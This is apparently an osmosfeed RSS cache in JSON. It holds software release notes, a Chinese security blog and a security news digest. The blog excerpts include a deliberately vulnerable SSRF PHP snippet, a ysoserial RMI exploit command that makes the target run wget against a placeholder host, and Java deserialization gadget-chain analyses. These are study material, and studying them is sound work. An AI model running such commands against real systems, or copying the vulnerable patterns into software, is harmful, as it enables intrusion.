{
  "sources": [
    {
      "title": "Release notes from osmosfeed",
      "feedUrl": "https://github.com/osmoscraft/osmosfeed/releases.atom",
      "siteUrl": "https://github.com/osmoscraft/osmosfeed/releases",
      "articles": [
        {
          "id": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.15.1",
          "author": null,
          "description": "Fixed: Favicon used as article image",
          "link": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.15.1",
          "publishedOn": "2022-06-22T06:05:35.000Z",
          "wordCount": 381,
          "title": "v1.15.1",
          "imageUrl": "https://opengraph.githubassets.com/773fe75a9ebd447ce664e0a73ba1ff89839c8a12b901abc4891691fbafe17c19/osmoscraft/osmosfeed/releases/tag/v1.15.1"
        },
        {
          "id": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.15.0",
          "author": null,
          "description": "Added: Resolve relative URLs in item link and media\nAdded: Item thumbnail fallback to channel thumbnail\nChore: Dependency updates\nThank you: @cpwnd",
          "link": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.15.0",
          "publishedOn": "2022-06-18T19:01:33.000Z",
          "wordCount": 397,
          "title": "v1.15.0",
          "imageUrl": "https://opengraph.githubassets.com/ce00272fbcf40921811c2125a0228c3b60c8a0b083dbaf2601960d034cc3be27/osmoscraft/osmosfeed/releases/tag/v1.15.0"
        },
        {
          "id": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.14.4",
          "author": null,
          "description": "Fixed: Several style issues",
          "link": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.14.4",
          "publishedOn": "2022-02-14T06:58:28.000Z",
          "wordCount": 377,
          "title": "v1.14.4",
          "imageUrl": "https://opengraph.githubassets.com/9a7043530dac30c2f389b7a285822cfe3c2b54efc7d2cdc63a0735d3cc5095a2/osmoscraft/osmosfeed/releases/tag/v1.14.4"
        },
        {
          "id": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.14.3",
          "author": null,
          "description": "style tweak",
          "link": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.14.3",
          "publishedOn": "2022-02-14T06:29:16.000Z",
          "wordCount": 408,
          "title": "v1.14.3",
          "imageUrl": "https://repository-images.githubusercontent.com/312859305/30a63d00-a162-11eb-8a1d-a3167673e96a"
        },
        {
          "id": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.14.2",
          "author": null,
          "description": "New: Adjust article grouping based on timezone. You need to add timezone in osmosfeed.yml for accurate grouping. See details in documentation.\nNew: Card title now toggles card content\nNew: all toggles on the UI are persisted with local storage. You can use it to track read/unread status within a single browser.\nNew: Build timestamp now links to the GitHub Action run\nChanged: Sources are sorted based on publish time rather than alphabetical order\nChanged: Style adjusted for easier reading\nFixed: Horizontal overflow on Safari\nFixed: HTML syntax error in default template",
          "link": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.14.2",
          "publishedOn": "2022-02-14T05:53:33.000Z",
          "wordCount": 480,
          "title": "v1.14.2",
          "imageUrl": "https://opengraph.githubassets.com/3d1aa7f7484f74c258c25be470129b65acc359f03644040243b05803daae68aa/osmoscraft/osmosfeed/releases/tag/v1.14.2"
        },
        {
          "id": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.14.1",
          "author": null,
          "description": "git typo in gh run url",
          "link": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.14.1",
          "publishedOn": "2022-02-14T05:26:23.000Z",
          "wordCount": 412,
          "title": "v1.14.1",
          "imageUrl": "https://repository-images.githubusercontent.com/312859305/30a63d00-a162-11eb-8a1d-a3167673e96a"
        },
        {
          "id": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.14.0",
          "author": null,
          "description": "New: Adjust article grouping based on timezone. You need to add timezone in osmosfeed.yml for accurate grouping. See details in documentation.\nNew: Card title now toggles card content\nNew: all toggles on the UI are persisted with local storage. You can use it to track read/unread status within a single browser.\nNew: Build timestamp now links to the GitHub Action run\nChanged: Sources are sorted based on publish time rather than alphabetical order\nChanged: Style adjusted for easier reading\nFixed: Horizontal overflow on Safari\nFixed: HTML syntax error in default template",
          "link": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.14.0",
          "publishedOn": "2022-02-14T05:13:00.000Z",
          "wordCount": 564,
          "title": "v1.14.0: V1.14.0 (#79)",
          "imageUrl": "https://repository-images.githubusercontent.com/312859305/30a63d00-a162-11eb-8a1d-a3167673e96a"
        },
        {
          "id": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.13.0",
          "author": null,
          "description": "New: Thumbnail image display for each article\nNew: Improved color, spacing, and typography for easier reading\nNew: Click the date to toggle all accordions on that day. Ctrl + Click to toggle all accordions on the entire site.\nChanged: All sections are expanded by default\nChanged: Switched to vitest for easier testing\nFixed: Long string (e.g. URL) caused horizontal overflow\nThank you: @naari3, @tianheg",
          "link": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.13.0",
          "publishedOn": "2022-02-13T05:05:17.000Z",
          "wordCount": 466,
          "title": "v1.13.0",
          "imageUrl": "https://opengraph.githubassets.com/fc77c41c87b2cd4d8990f4c940e0ddf681667b6b6e4363b0f609861b7ae5b6d8/osmoscraft/osmosfeed/releases/tag/v1.13.0"
        },
        {
          "id": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.12.1",
          "author": null,
          "description": "Fixed: Future articles appeared in the feed\nFxied: Security vulnerability from axios\nThank you: @naari3",
          "link": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.12.1",
          "publishedOn": "2022-02-12T17:46:42.000Z",
          "wordCount": 390,
          "title": "v1.12.1",
          "imageUrl": "https://opengraph.githubassets.com/d69790a31f94b1adf743c58bae86b9754de6969cceb83f11b8fbeb28ab1ad632/osmoscraft/osmosfeed/releases/tag/v1.12.1"
        },
        {
          "id": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.12.0",
          "author": null,
          "description": "New: When one of the sources download fails, fall back to cache and continue rest of the build.\nChore: Dependency updates\nAdded docs for Netlify deployment\nFixed #71 #69 #65\nThank you: @sokomin, @molakirlee, @philippnagel, @tianheg",
          "link": "https://github.com/osmoscraft/osmosfeed/releases/tag/v1.12.0",
          "publishedOn": "2022-01-10T05:25:18.000Z",
          "wordCount": 432,
          "title": "v1.12.0",
          "imageUrl": "https://opengraph.githubassets.com/acf2691ac8379705dfc121f0feb76e8eb7554d5de2d4c4ea49c3a70d68e30a31/osmoscraft/osmosfeed/releases/tag/v1.12.0"
        }
      ]
    },
    {
      "title": "bsmali4的小窝",
      "feedUrl": "https://www.codersec.net/feed.xml",
      "siteUrl": "http://www.codersec.net/",
      "articles": [
        {
          "id": "http://www.codersec.net/2020/05/SSRF%E6%94%BB%E5%87%BB%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/",
          "author": null,
          "description": "前言\n这是很早就整理的笔记，今天想起来发到博客上，还是要保持写文章总结的习惯啊。\n最近笔者在看讲SSRF、protocol \tsmuggle、HTTP request smuggle、SSO任意跳转，Url解析不一致导致的安全问题。一方面由衷地佩服演讲人的脑洞和安全功底，另外一方面又在笔者又在反思，如果是我，我会怎么去发现此类漏洞，解决方案又是什么。本文不同于各大公众号千篇一律的复现、验证漏洞文章，会加入自己的思考和心得。鉴于文章会存在一些敏感内容，笔者会本着在删除敏感内容的前提下，尽量让大家都能看懂的标准去和大家一起探讨这方面的知识。\n在学习前之前我会给自己提出来如下问题:\n1.漏洞的本质到底什么\n2.应该如何防御\n3.如何发现同类漏洞，如何自动化找到此类漏洞甚至0day\n什么是SSRF\nSSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。\n\n<?php\n\t$ch = curl_init();\n    curl_setopt($ch, CURLOPT_URL, $_GET['url']);\n    #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\n    curl_setopt($ch, CURLOPT_HEADER, 0);\n    #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);\n    $data =curl_exec($ch);\n    curl_close($ch);\n    echo $data;\n?>\n…",
          "link": "http://www.codersec.net/2020/05/SSRF%E6%94%BB%E5%87%BB%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/",
          "publishedOn": "2020-05-15T00:00:00.000Z",
          "wordCount": 651,
          "title": "SSRF攻击姿势汇总",
          "imageUrl": null
        },
        {
          "id": "http://www.codersec.net/2019/12/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E6%83%B3%E5%92%8C%E6%80%BB%E7%BB%93/",
          "author": null,
          "description": "前言\n2019将尽，一转眼从毕业到现在工作已快三年，这三年虽工作上不敢说有多大的成就，但是个人对比过去的自己来看的确有进步和成长。博客自从换到github之后，基本都是记录一些平时工作、业余时间中遇到和解决的技术性问题。整个博客关于非技术性文章基本寥寥无几，加上内心有一些想法实在“按耐不住”，所以促使我要写一份不谈任何技术的2019总结。其实换个角度，这篇文章也是技术文章，只不过它不再是那种传统意义上的技术而已。文章所写，皆是本人所想、所感、所悟，可能不对或者有异议，请大家带着一个开放包容的心态来看这篇文章。\n三个阶段\n上大学之前，我对这个信息安全的了解基本为零。和许多人由于看《黑客帝国》迸发出想从事信息安全行业不同，我看过的是一部电视剧《零号国境线》，里面的岳峰是一个良性黑客(也就是现在俗称的白帽子)深深地震撼了我。\n认知的第一阶段\n上大学之后，一次目睹学长在科技协会招新活动时展现出的网络安全技术掀开了我对这个行业认知的第一个阶段：信息安全真的好炫酷，简直无所不能。\n认知的第二阶段\n极其幸运地顺利进入到信息安全社团，在接触和学习一段时间之后，我发现事情没有我想象的那么简单。经过一段时间的碰壁受挫甚至让我感觉现代的系统和框架都很安全，漏洞基本是找不到的。这就是我认知的第二个阶段，现代系统框架都很安全。\n认知的第三个阶段\n初涉这个领域的受挫让我觉得黑客并没有我想象的那么无敌。又经过一段时间的学习之后，我发现产生这种情愫的原因还是来源于一个毛头小子只接触到了这个行业的冰山一角。所谓一叶障目，不见泰山大致就是这个道理了。经过一段时间追随大佬学习之后，我发现现代系统框架对于脚本小子很安全，在真正的大牛面前不堪一击，出现阶段二的认知真的只是因为自己不够强。\n工作思维\n团队>个人\n一个人的能力再强，总归是有限的，特别是作为绝大部分普通人的我们。要学会合理和团队的其他成员沟通、合作、寻求…",
          "link": "http://www.codersec.net/2019/12/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E6%83%B3%E5%92%8C%E6%80%BB%E7%BB%93/",
          "publishedOn": "2019-12-03T00:00:00.000Z",
          "wordCount": 130,
          "title": "个人随想和总结",
          "imageUrl": null
        },
        {
          "id": "http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/",
          "author": null,
          "description": "说明\n在日常扫描内网服务器的时候发现有几台主机开放了rmi服务，根据以往经验rmi服务存在反序列化漏洞，本以为可以直接拿ysoserial一把梭直接干。\n\njava -cp ysoserial.exploit.RMIRegistryExploit 10.9.15.193 9999 CommonsCollections2 “wget http://xxxxx:3344”\n以往都成功过，但是这次居然爆出了filter status: REJECTED\n\n出现这种情况的原因是[java 8 update 121]之后RMIRegistryImpl.registryFilter() 的限制http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5534221c23fc/src/share/classes/sun/rmi/registry/RegistryImpl.java#l388\n可以看到在idk8 update 121之后在registryFilter函数中限制了类型。\n\n本地写个rmi注册服务模拟下:\n\npublic static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException {\n    //System.setProperty(\"sun.rmi.registry.registryFilter\", \"java.util.HashMap;\");\n    //System.setProperty(\"sun.rmi.registry.registryFilter\", \"java.util.HashMap;sun.reflect.annotation.**;\");\n    //System.setProp…",
          "link": "http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/",
          "publishedOn": "2018-09-20T00:00:00.000Z",
          "wordCount": 886,
          "title": "一次攻击内网rmi服务的深思",
          "imageUrl": null
        },
        {
          "id": "http://www.codersec.net/2018/07/peewee%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/",
          "author": null,
          "description": "起因\n上线了2天的hunter-server在线上除了问题，最后看日志的时候发现出现了Lost connection to MySQL server during query。经过一番查询之后，知道是wait_timeout的问题，mysql默认的wait_timeout是8小时，也就是28800秒。从一次建立mysql连接开始，如果8小时之内不做任何操作，那么此次连接会自动过期销毁，导致后面无法进行正常的sql操作，出现Lost connection to MySQL server during query的异常。\nmysql> show global variables like '%wait%_timeout';\n+--------------------------+-------+\n| Variable_name            | Value |\n+--------------------------+-------+\n| innodb_lock_wait_timeout | 50    |\n| table_lock_wait_timeout  | 50    |\n| wait_timeout             | 3     |\n+--------------------------+-------+\n3 rows in set (0.00 sec)\n\n我手动设置成了3秒，为了测试方便，设置命令为\nset global wait_timeout=3;\n\n按照官网的写法写了一个demo,\n\nclass Person(HunterModel):\n    \"\"\"\n    id : id\n    username: 用户名\n    password: 密码\n    \"\"\"\n    username = TextField(default='')\n    p…",
          "link": "http://www.codersec.net/2018/07/peewee%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/",
          "publishedOn": "2018-07-24T00:00:00.000Z",
          "wordCount": 603,
          "title": "2018-7-24-peewee 连接池踩坑日记",
          "imageUrl": null
        },
        {
          "id": "http://www.codersec.net/2018/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E7%8E%84%E9%93%81%E9%87%8D%E5%89%91%E4%B9%8BCommonsCollection(%E4%B8%8A)/",
          "author": null,
          "description": "前言:\n玄铁重剑，是金庸小说笔下第一神剑。由「玄铁」制成，重八八六十四斤；由「剑魔」独孤求败所使，四十岁前持之无敌于天下。 独孤求败逝去后为杨过所得，并由独孤求败的「朋友」神雕引导，之后在神雕的指导下，也根据独孤求败的独门秘籍及练功方法，练成了一身天下无敌的剑法及内功心法。\n主角:\nCommonsCollection, commons-collections.jar\n介绍:\nJava Collections Framework 是JDK 1.2中的一个重要组成部分。它增加了许多强大的数据结构，加速了最重要的Java应用程序的开发。从那时起，它已经成为Java中集合处理的公认标准。官网介绍如下:\n\nCommons Collections使用场景很广，很多商业,开源项目都使用到了commons-collections.jar。\n很多组件，容器，cms(诸如WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等)的rce漏洞都和Commons Collections反序列被披露事件有关。\n正文:\n光是在ysoserial中，Commons Collections反序列化漏洞就被分成了4组，分别是CommonsCollections1,CommonsCollections2,CommonsCollections3,CommonsCollections4,关于CommonsCollection的分析，由于篇幅过长，笔者会将其分为上下两篇。\n  CommonsCollections1是目测现在网上被分析的最多的一篇文章了吧，随便搜索一下，就可以看到很多分析的文章。我这里整理几篇分析比较经典的文章，如果你想深入了解，强烈建议静下心来好好阅读一番。http://wooyun.jozxing.cc/static/drops/papers-10467.html\nht…",
          "link": "http://www.codersec.net/2018/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E7%8E%84%E9%93%81%E9%87%8D%E5%89%91%E4%B9%8BCommonsCollection(%E4%B8%8A)/",
          "publishedOn": "2018-02-01T00:00:00.000Z",
          "wordCount": 1027,
          "title": "java反序列化漏洞-玄铁重剑之CommonsCollection(上)",
          "imageUrl": null
        },
        {
          "id": "http://www.codersec.net/2018/01/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E9%87%91%E8%9B%87%E5%89%91%E4%B9%8Bhibernate(%E4%B8%8B)/",
          "author": null,
          "description": "前言:\n金蛇剑:此剑金光灿烂形状奇特，剑身犹如是一条蛇盘曲而成。蛇尾构成剑尖蛇头藏与剑柄，握在手中甚是沉重，原是由黄金铸造而成。此剑形状甚是奇特，整柄剑就如是一条蛇盘曲而成，蛇尾勾成剑柄，蛇头则是剑尖，蛇舌伸出分叉，是以剑尖竟有两叉。\n主角:\nhibernate\n介绍:\nHibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，它将POJO与数据库表建立映射关系，是一个全自动的orm框架，hibernate可以自动生成SQL语句，自动执行，使得Java程序员可以随心所欲的使用对象编程思维来操纵数据库。曾几何时，java web程序员必备面试宝典,ssh(spring+struts2+hibernate)，当年笔者上javaweb课时，老师安利ssh,可见hibernate当年影响力多大。今天笔者跟着大家一起来学习分析hibernate的反序列化漏洞。\n正文:\n接着上一篇写，其实这篇和上篇利用链区别不是很大，只是将TemplatesImpl用JdbcRowSetImpl替换，要想讲清楚这个，必须先要讲下JNDI,翻译过来为Java命令和目录接口。其中在2016年blackhat大会上，有个很详细ppt。https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf\n  \n  其中rmi,dns，ldap等等都是  JNDI 具体的实现方式。这篇的主角JdbcRowSetImpl，就是实现了rmi。RMI全称是Remote Method Invocation－远程方法调用，Java RMI在JDK1.1中实现的，其威力就体现在它强大的开发分布式网络应用的能力上，是纯Java的网络分布式应用…",
          "link": "http://www.codersec.net/2018/01/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E9%87%91%E8%9B%87%E5%89%91%E4%B9%8Bhibernate(%E4%B8%8B)/",
          "publishedOn": "2018-01-26T00:00:00.000Z",
          "wordCount": 197,
          "title": "java反序列化漏洞-金蛇剑之hibernate(下)",
          "imageUrl": null
        },
        {
          "id": "http://www.codersec.net/2018/01/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E9%87%91%E8%9B%87%E5%89%91%E4%B9%8Bhibernate(%E4%B8%8A)/",
          "author": null,
          "description": "前言:\n金蛇剑:此剑金光灿烂形状奇特，剑身犹如是一条蛇盘曲而成。蛇尾构成剑尖蛇头藏与剑柄，握在手中甚是沉重，原是由黄金铸造而成。此剑形状甚是奇特，整柄剑就如是一条蛇盘曲而成，蛇尾勾成剑柄，蛇头则是剑尖，蛇舌伸出分叉，是以剑尖竟有两叉。\n主角:\nhibernate\n介绍:\nHibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，它将POJO与数据库表建立映射关系，是一个全自动的orm框架，hibernate可以自动生成SQL语句，自动执行，使得Java程序员可以随心所欲的使用对象编程思维来操纵数据库。曾几何时，java web程序员必备面试宝典,ssh(spring+struts2+hibernate)，当年笔者上javaweb课时，老师安利ssh,可见hibernate当年影响力多大。今天笔者跟着大家一起来学习分析hibernate的反序列化漏洞。\n正文:\n全局搜索了下关键字invoke,发现调用的地方很多。其中org.hibernate.property.BasicPropertyAccessor中BasicGetter类中get函数中调用了此函数，后面构造分析的poc都是基于此类的。\n \n 根据前几篇的分析，我们大致有了思路。看能不能借助 Xalan’sTemplatesImpl的_bytecodes字段来new一个evil类，或者是借助JdbcRowSetImpl,JNDIConnectionPool来做JNDI绑定(绑定这个词我也不知道恰不恰当)。\n \n org.hibernate.engine.spi.TypedValue.TypedValue.readObject()->org.hibernate.engine.spi.TypedValue.initTransients()->org.hibernate.type.Compo…",
          "link": "http://www.codersec.net/2018/01/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E9%87%91%E8%9B%87%E5%89%91%E4%B9%8Bhibernate(%E4%B8%8A)/",
          "publishedOn": "2018-01-26T00:00:00.000Z",
          "wordCount": 265,
          "title": "java反序列化漏洞-金蛇剑之hibernate(上)",
          "imageUrl": null
        },
        {
          "id": "http://www.codersec.net/2018/01/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E7%8E%84%E9%93%81%E9%87%8D%E5%89%91%E4%B9%8BCommonsCollection(%E4%B8%8B)/",
          "author": null,
          "description": "前言:\n玄铁重剑，是金庸小说笔下第一神剑。由「玄铁」制成，重八八六十四斤；由「剑魔」独孤求败所使，四十岁前持之无敌于天下。 独孤求败逝去后为杨过所得，并由独孤求败的「朋友」神雕引导，之后在神雕的指导下，也根据独孤求败的独门秘籍及练功方法，练成了一身天下无敌的剑法及内功心法。\n主角:\nCommonsCollection, commons-collections.jar\n介绍:\nJava Collections Framework 是JDK 1.2中的一个重要组成部分。它增加了许多强大的数据结构，加速了最重要的Java应用程序的开发。从那时起，它已经成为Java中集合处理的公认标准。官网介绍如下:\n\nCommons Collections使用场景很广，很多商业,开源项目都使用到了commons-collections.jar。\n很多组件，容器，cms(诸如WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等)的rce漏洞都和Commons Collections反序列被披露事件有关。\n正文:\n再讲一个执行链，在ysoserial中，CommonsCollections2提到了，通过上一篇的分析，我们得知执行链很多。接下来接着分析另外一个执行链, 需要借助的是PriorityQueue这个类，这里我找到了一条执行链\nPriorityQueue.readObject()->PriorityQueue.heapify()->PriorityQueue.siftDown()->PriorityQueue.siftDownUsingComparator()->TransformingComparator.compare()->InvokerTransformer.transformat()\n这和ysoserial提到的是一样的, 下面我们自己来尝试构造下po…",
          "link": "http://www.codersec.net/2018/01/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E7%8E%84%E9%93%81%E9%87%8D%E5%89%91%E4%B9%8BCommonsCollection(%E4%B8%8B)/",
          "publishedOn": "2018-01-26T00:00:00.000Z",
          "wordCount": 397,
          "title": "java反序列化漏洞-玄铁重剑之CommonsCollection(下)",
          "imageUrl": null
        },
        {
          "id": "http://www.codersec.net/2018/01/SpringMvc-xss(CVE-2014-1904)%E5%88%86%E6%9E%90%E4%B8%8E%E5%AD%A6%E4%B9%A0/",
          "author": null,
          "description": "介绍\nhttps://pivotal.io/cn/security/cve-2014-1904\n根据漏洞描述：\n\n内容\n可以知道需要用form标签，选择3.2.8版本以前的spring-mvc。然后写了一个demo,代码如下:\nbean\n\n````\npackage net.codersec.entity;\n\npublic String getUsername() {\n    return username;\n}\n\npublic void setUsername(String username) {\n    this.username = username;\n}\n\npublic String getPassword() {\n    return password;\n}\n\npublic void setPassword(String password) {\n    this.password = password;\n}\n}\n````\n\n\ncontroller\n\n````\npackage net.codersec.controller;\n\nimport net.codersec.entity.User;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n/**\n * Created by bsmali4 on 18/1/25.\n */\n@Controller\npublic class UseController {\n\n    @RequestMapping(value = \"/login/*\")\n    public String login(Model model){\n        model.addAttribute(\"user\", new User());\n        return \"login\";\n    }\n\n}\n\n````\n\n\n其中标签需要绑定一个bean，其在form的commandName属性绑定\n\n````\n\t  <%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>\n<%@ taglib prefix=\"form\" uri=\"http://www.springframework.org/tags/form\" %>\n<html>\n<body>\n<h2>Hello,welcome to CVE-2014-1904!</h2>\n<form:form method=\"post\" commandName=\"user\">\n    <form:input path=\"username\"/>\n    <form:input path=\"password\"/>\n    <input type=\"submit\" value=\"login\"/>\n\n</form:form>\n\n</body>\n</html>\n\n````\n\n\n这里需要说明一个特性，在form:form中未设置action的时候，spring-mvc会自动将当前url设置为action,比如\n  \n  如果没有过滤的话会造成一个xss\n  \n  官方在3.2.8版本修复补丁如下\n在org/springframework/web/servlet/tags/form/FormTag.java位置\n\n\n其实就是url转码了一次,怎么绕过，大家可以自己试试?我试了几种常见的方式没有绕过去，如果大家有想法，欢迎一起交流。本文权当笔记纪录，文字很不严谨，如有错误，欢迎提出来。\n参考文档\nhttps://github.com/spring-projects/spring-framework/commit/741b4b229ae032bd17175b46f98673ce0bd2d485\nhttps://www.cnblogs.com/Summer7C/p/4713190.html",
          "link": "http://www.codersec.net/2018/01/SpringMvc-xss(CVE-2014-1904)%E5%88%86%E6%9E%90%E4%B8%8E%E5%AD%A6%E4%B9%A0/",
          "publishedOn": "2018-01-26T00:00:00.000Z",
          "wordCount": 201,
          "title": "SpringMvc xss (CVE-2014-1904)学习与分析",
          "imageUrl": null
        },
        {
          "id": "http://www.codersec.net/2018/01/Spring-XXE%E6%BC%8F%E6%B4%9E(CVE-2013-4152,CVE-2014-0225)/",
          "author": null,
          "description": "#介绍\n\n````\npublic class Application {\nprivate static final String FILE_NAME = \"src/main/java/test/settings.xml\";\nprivate Settings settings = new Settings();\nprivate Marshaller marshaller;\nprivate Unmarshaller unmarshaller;\n\npublic void setMarshaller(Marshaller marshaller) {\n    this.marshaller = marshaller;\n}\n\npublic void setUnmarshaller(Unmarshaller unmarshaller) {\n    this.unmarshaller = unmarshaller;\n}\n\npublic void saveSettings() throws IOException {\n    FileOutputStream os = null;\n    try {\n        os = new FileOutputStream(FILE_NAME);\n        this.marshaller.marshal(settings, new StreamResult(os));\n    } finally {\n        if (os != null) {\n            os.close();\n        }\n    }\n}\n\npublic void loadSettings() throws IOException {\n    FileInputStream is = null;\n    try {\n        is = new…",
          "link": "http://www.codersec.net/2018/01/Spring-XXE%E6%BC%8F%E6%B4%9E(CVE-2013-4152,CVE-2014-0225)/",
          "publishedOn": "2018-01-26T00:00:00.000Z",
          "wordCount": 495,
          "title": "2018-01-26-Spring XXE漏洞(CVE-2013-4152,CVE-2014-0225)",
          "imageUrl": null
        }
      ]
    },
    {
      "title": "Sec-News 安全文摘",
      "feedUrl": "https://govuln.com/news/feed/",
      "siteUrl": "https://govuln.com/news/feed/",
      "articles": [
        {
          "id": "https://govuln.com/news/url/g8dr",
          "author": null,
          "description": "Rethinking the Security Threats of Stale DNS Glue Records",
          "link": "https://govuln.com/news/url/g8dr",
          "publishedOn": "2024-08-23T08:51:21.036Z",
          "wordCount": 68265,
          "title": "Rethinking the Security Threats of Stale DNS Glue Records",
          "imageUrl": null
        },
        {
          "id": "https://govuln.com/news/url/ZNQv",
          "author": null,
          "description": "魔形女再袭？最新Android通杀漏洞CVE-2024-31317分析与利用研究",
          "link": "https://govuln.com/news/url/ZNQv",
          "publishedOn": "2024-08-22T14:51:26.891Z",
          "wordCount": 264,
          "title": "魔形女再袭？最新Android通杀漏洞CVE-2024-31317分析与利用研究",
          "imageUrl": null
        },
        {
          "id": "https://govuln.com/news/url/3KJN",
          "author": null,
          "description": "如何巧妙构建“LDAPS”服务器利用JNDI注入",
          "link": "https://govuln.com/news/url/3KJN",
          "publishedOn": "2024-08-16T15:24:14.047Z",
          "wordCount": 331,
          "title": "如何巧妙构建“LDAPS”服务器利用JNDI注入",
          "imageUrl": null
        },
        {
          "id": "https://govuln.com/news/url/a6kA",
          "author": null,
          "description": "Chained for attack: OpenVPN vulnerabilities discovered leading to RCE and LPE",
          "link": "https://govuln.com/news/url/a6kA",
          "publishedOn": "2024-08-15T09:26:25.852Z",
          "wordCount": 6282,
          "title": "Chained for attack: OpenVPN vulnerabilities discovered leading to RCE and LPE",
          "imageUrl": "https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2024/08/OpenVpn-featured-image-1.png"
        },
        {
          "id": "https://govuln.com/news/url/B16r",
          "author": null,
          "description": "详解：L4LB四层负载均衡IP伪造漏洞",
          "link": "https://govuln.com/news/url/B16r",
          "publishedOn": "2024-08-11T14:39:13.675Z",
          "wordCount": 39914,
          "title": "详解：L4LB四层负载均衡IP伪造漏洞",
          "imageUrl": "https://mmbiz.qpic.cn/mmbiz_jpg/IjnZ9ic9bGHuk6kVdCJWH6TaOmibMOJ8apYV5vhGbUYUM24HdRwMqqJTPMHWcyuG9e4KWcDIH8dGDBYv94acuDcQ/0?wx_fmt=jpeg"
        },
        {
          "id": "https://govuln.com/news/url/q60v",
          "author": null,
          "description": "XenForo RCE via CSRF",
          "link": "https://govuln.com/news/url/q60v",
          "publishedOn": "2024-08-08T03:12:09.993Z",
          "wordCount": 3252,
          "title": "XenForo RCE via CSRF",
          "imageUrl": "https://ssd-disclosure.com/wp-content/uploads/2024/06/screenshot.png"
        },
        {
          "id": "https://govuln.com/news/url/rm0V",
          "author": null,
          "description": "SonicWall SMA100 Stored XSS to RCE",
          "link": "https://govuln.com/news/url/rm0V",
          "publishedOn": "2024-08-08T03:11:24.401Z",
          "wordCount": 3791,
          "title": "SonicWall SMA100 Stored XSS to RCE",
          "imageUrl": "https://ssd-disclosure.com/wp-content/uploads/2024/07/sonicwall_log_view.png"
        },
        {
          "id": "https://govuln.com/news/url/ApDJ",
          "author": null,
          "description": "Listen to the whispers: web timing attacks that actually work",
          "link": "https://govuln.com/news/url/ApDJ",
          "publishedOn": "2024-08-08T03:01:01.097Z",
          "wordCount": 6696,
          "title": "Listen to the whispers: web timing attacks that actually work",
          "imageUrl": "https://portswigger.net/cms/images/39/7f/e41b-twittercard-listen-to-the-whispers-twitter.png"
        },
        {
          "id": "https://govuln.com/news/url/mb0D",
          "author": null,
          "description": "From opcode to code: how AI chatbots can help with decompilation",
          "link": "https://govuln.com/news/url/mb0D",
          "publishedOn": "2024-08-07T12:03:11.571Z",
          "wordCount": null,
          "title": "From opcode to code: how AI chatbots can help with decompilation",
          "imageUrl": null
        },
        {
          "id": "https://govuln.com/news/url/6ynr",
          "author": null,
          "description": "结合 Jimureport 的某个漏洞披露看 Aviator 表达式注入",
          "link": "https://govuln.com/news/url/6ynr",
          "publishedOn": "2024-08-07T11:12:22.470Z",
          "wordCount": 469,
          "title": "结合 Jimureport 的某个漏洞披露看 Aviator 表达式注入",
          "imageUrl": null
        },
        {
          "id": "https://govuln.com/news/url/7RKO",
          "author": null,
